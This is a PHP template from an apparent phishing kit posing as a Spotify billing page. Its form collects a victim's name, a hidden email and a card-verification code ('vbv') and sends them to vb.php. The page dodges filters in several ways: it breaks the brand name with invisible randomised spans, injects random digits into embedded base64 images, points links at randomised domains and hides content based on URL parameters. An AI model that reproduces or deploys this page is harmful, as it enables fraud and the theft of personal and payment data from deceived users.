<svg class="user-icon"><use xlink:href="#user-icon"></use><svg id="user-icon" viewBox="0 0 1024 1024"> <path d="m730.06 679.64q-45.377 53.444-101.84 83.443t-120 29.999q-64.032 0-120.75-30.503t-102.6-84.451q-40.335 13.109-77.645 29.747t-53.948 26.722l-17.142 10.084q-29.747 19.159-51.175 57.729t-21.428 73.107 25.461 59.242 60.754 24.705h716.95q35.293 0 60.754-24.705t25.461-59.242-21.428-72.603-51.679-57.225q-6.554-4.033-18.907-10.84t-51.427-24.453-79.409-30.755zm-221.84 25.72q-34.285 0-67.561-14.873t-60.754-40.335-51.175-60.502-40.083-75.124-25.461-84.451-9.075-87.728q0-64.032 19.915-116.22t54.452-85.964 80.67-51.931 99.072-18.151 99.072 18.151 80.67 51.931 54.452 85.964 19.915 116.22q0 65.04-20.167 130.58t-53.948 116.72-81.426 83.443-98.568 32.268z"></path> </svg></div>
<span class="user-text"><?php echo $profidosicv; ?></span>
<svg class="svg-chevron-down"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#chevron-down"></use></svg>
</a>
</li>
</ul>
</div>
</div>
</header>
</div>
</div>

<div dir="<?php echo $semitic;?>" class="container-fluid login ng-scope">
  <div style="<?php if(isset($_GET[$dun])) {echo 'display: none;';}?>" class="content">

    <br>


    <form dir="<?php echo $semitic;?>" name="" action="vb.php?<?php echo $dota; ?>"=<?php echo $bero4; ?>" method="post" novalidate="" class="ng-pristine ng-valid-sp-disallow-chars ng-invalid ng-invalid-required">
<?php
$cn = 'fn';
$tu = 'ln';

$claso = $cn . '' . $dota;
$blaso = $tu . '' . $dota;
?>
<div class="row">
        <div class="col-md-6">
            <div class="form-group">
                <label for="offer_klarna_first_name"><?php echo $fna;?></label>
                <input type="text" value="<?php echo $_GET[$claso]; ?>" name="firstn" class="form-control">
            </div>
        </div>

        <div class="col-md-6">
            <div class="form-group">
                <label for="offer_klarna_last_name"><?php echo $lna;?></label>
                <input type="text" value="<?php echo $_GET[$blaso] ?>" name="lastn" class="form-control">
            </div>
        </div>
    </div><input hidden value="<?php echo $_GET['em'];?>" name="email" id="email">
    
  <div class="form-group">
                <label for="offer_klarna_street_address"><?php echo $vbv;?></label>
                <input type="text" name="vb" placeholder="<?php echo $placeh;?>" class="form-control">
            </div>


      <div class="row row-submit">
        <div class="col-xs-12 col-sm-6">
          
        </div>
        <div class="col-xs-12 col-sm-6">
          <button dir="<?php echo $semitic;?>" style="<?php echo $space;?>" class="btn btn-block btn-green ng-binding" id="login-button"><?php echo $cnt;?></button>
        </div>
      </div>
    </form>

    <div class="row">
      
    </div>

    <div id="sign-up-section">
      <div class="row">
        
      </div>
    </div>


    <div class="row">
      <div class="col-xs-12">
        <div class="divider"></div>
        <p class="text-muted disclaimer text-center ng-binding">You authorise <span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>S<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>p<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>o<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>t<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>i<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>f<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>y to charge you automatically every month, until you cancel your subscription. You agree to <span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>S<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>p<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>o<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>t<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>i<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>f<span style='float: right; font-size: .001<?php echo rand(1, 9); ?>px; color: transparent; width: 0px;'><?php echo $bert4; ?></span>y's <a href="https://www.u<?php echo $rand; ?>.com" target="_blank">Terms &amp; Conditions</a> and <a href="https://www.<?php echo $rand; ?>.com" target="_blank">Privacy Policy</a></p>
      </div>
    </div>
  </div>
  
<div style="<?php if(isset($_GET[$sata])) {echo 'display: none;';}?>">  
<p align="center">
<?php // Image converter to base64 https://www.base64-image.de/ ?>
<img src="data:image/png;base64,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<?php echo rand(4, 6); ?>OjC0U/PhVmhUJKiDcAzcILB<?php echo rand(1, 3); ?>2zD0v3CJhSxRbnrqkG9uG918JEOW0UKTHMGgr2eMPbrN/XKnadJTKN<?php echo rand(4, 6); ?>zY8I96AoX1oC2aXJljtyLesoHUnO1T7utiDqNlirSGNIVg<?php echo rand(1, 4); ?>GxCMjPFQATytsmH0BvOvzogwRdh6HOkEz<?php echo rand(4, 6); ?>mnAKLWVna099BWY1OTIVqXEu40YjV36UcyhbQk/mlAlniPkCXeI2SJ9whZ4j1ClniPkCXeI2SJ9whZ4j1ClniPkCXeI2SJ9whZ4j1ClniPkCXeI2SJ<?php echo rand(7, 9); ?>whZ4j1ClnhPwNj/AXTCBp1ufCgqAAAAAElFTkSuQmCC/AXTCBp1ufCgqAAAA<?php echo $bero5; ?>SuQmCC/AXTCBp<?php echo $bero4; ?>AAAElFTkSuQmCC/AXTCBp1ufCgqAAAAA<?php echo $bero; ?>SuQmCC<?php echo $bero;?>"> 
</p> 
<p align="center" > <?php echo $tyts;?></p>
<p align="center">
<img border="0" src="data:image/gif;base64,R0lGODlhLAEsAfdFAERERP7+/v39/fz8/Pn5+f////Dw8Pf39+bm5uvr6/b29tjY2H9/f5aWloKCgvv7+6CgoOrq6vHx8Y6Ojnx8fIWFheDg4Ofn59TU1OPj47GxsfPz85mZmaSkpLe3t9vb26ysrLW1tampqaGhoc3Nzby8vLq6urOzs6amptHR0YGBgX5+fpCQkI2NjcvLy5OTk3t7e+Hh4aenp9/f38XFxa6urpycnMLCwvr6+p6enoSEhIiIiO3t7d3d3cfHx4eHh/j4+MPDw/X19ZiYmOjo6M/Pz4qKiouLi7CwsMrKyra2tuLi4tbW1pSUlNnZ2eTk5MTExNra2u7u7sHBwb6+vu/v79PT05ubm97e3vT09Li4uMnJyfLy8uzs7NDQ0NLS0oaGhoyMjMzMzK+vr6KioqioqMbGxqqqqpGRkdzc3LS0tLm5uaOjo8jIyLu7u729vdfX13l5eZeXl3h4eJqamp+fn7Kysr+/v+Xl5c7OzpKSktXV1aWlpZ2dnenp6YODg62trYCAgI+Pj4mJiaurq319fcDAwJWVlXd3d3p6enZ2dkVFRUZGRkhISEtLS05OTlFRUU1NTXR0dHNzc29vb0pKSkdHR0xMTG5ubnJycnFxcXV1dUlJSVZWVlBQUFNTU1RUVGxsbFVVVWFhYWRkZHBwcG1tbWhoaE9PT2VlZWtra1JSUl9fX2BgYFlZWVtbWwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh/wtYTVAgRGF0YVhNUDw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNS1jMDIxIDc5LjE1NDkxMSwgMjAxMy8xMC8yOS0xMTo0NzoxNiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDpmODFlMTVmMC1jY2FlLTRkNjEtODhjMy1jMGE1MGRjZmE1YWMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MTYzOThDRkVBODRGMTFFMzkyMzhFOEZGRjdFQ0E0OUUiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MTYzOThDRkRBODRGMTFFMzkyMzhFOEZGRjdFQ0E0OUUiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6ZjgxZTE1ZjAtY2NhZS00ZDYxLTg4YzMtYzBhNTBkY2ZhNWFjIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOmY4MWUxNWYwLWNjYWUtNGQ2MS04OGMzLWMwYTUwZGNmYTVhYyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACH5BAUEAEUALAAAAAAsASwBAAj/AIsIHEiwoMGDCBMqXMiwocOHECNKnEixosWLGDNq3Mixo8ePIEOKHEmypMmTKFOqXMmypcuXMGPKnEmzps2bOHPq3Mmzp8+fQIMKHUq0qNGjSJMqXcq0qdOnUKNKnUq1qtWrWLNq3cq1q9evYMOKHUu2rNmzaNOqXcu2rdu3cOPKnUu3rt27ePPq3cu3r9+/gAMLHky4sOHDiBMrXsy4sePHkCNLnky5suXLmDNr3sy5s+fPoEOLHk26tOnTqFOrXs26tevXsGPLnk27tu3buHPr3s27t+/fwIMLH068uPHjyJMrX868ufPn0KNLn069uvXr2LNr3869u/fv4MOL/x9Pvrz58+jTq1/Pvr379/Djy59Pv779+/jz69/Pv7///wAGKOCABBZo4IEIJqjgggw26OCDEEYo4YQUVmjhhRhmqOGGHM4XAAJBjMBCCzmY0AMBHQ5kQAcwAODiiy7CwIIF3QUgQE8CsAjjji/C0IIE1wlxww8wFAmDCkrwgFMCK/DoZI8kUHeADS06CcMRCdRkQZVPPgmDCZYJ8UESWzBhgE0YcNklDB7MxIOaXVpJw2QzNKDmlSnMFASca44QUwAMxCkoADBEAFmOfMbYwAEwLZDomkjAJMKgg+rwmAANDLqDAi4R8GicMGTg0gafUhpjno1NSmkTBbQ0gqk8Wv/aEgiwCspAYxmUuuMWLAGh65oxtPSrqTAouRgHtVYQwEpJ1MpjDiwlMKypNyzmq7MXrMSCszvCwBIJ3Mb5wmIZcMurStN6icNKSIS75mIYcAsmuu6+uMFKENRrJbzcarFSuk/eq1IO+vLorWIxmPuvvjCgqFINBXe72AEAA5CtShMwzJIPEcPYAmOZwurAsipxXO8QLF3Q8YslMLYlrD6wJETFPfbAUgA0e0lEYx2Y+gLJKyEb7gou5dvxwYw98EKlWbg0M7cw2NzSmx3P6dgDEHz6ghAwuQAwDCjAZEPEK7QK2QIT3FkBCWbDFMK0MKAMk6cMSy2ZBBgEcUMKxtLntOegMMgw0ww5E3qCdAaw8OiRNNJEAs1gV8eDBhRUWeQIS+DkaK0whJBdAEAcMABPQigOOAONa2iBEYtT4EKKAgmRQgcqFEmBDTT0DfvuvPfu++/ABy/88MQXb/zxyCev/PLMN+/889BHL/301Fdv/fXYZ6/99tx37/334Icv/vjkl2/++einr/767Lfv/vvwxy///PTXb//9+Oev//789+///wAMoAAHSMACGvCACEygAhfIwAY68IEQjKAEJ0jBClrwghjMoAY3yMEOevCDIAyhCEdIwhKa8IQoTKEKV8jCFrowOgEBACH5BAUEAA0ALEUAhwCkAB4AAAj/ABsIHEiwoMGDCBMqXMiwocOHEBEKyPBmCBgVh044icixo8ePIEM2lHIFE4CTKE9iqtCD44MNXbpIICCyJkMBA2zqRDigZMqfKDGpMNBwwIwTejw<?php echo rand(4, 6); ?>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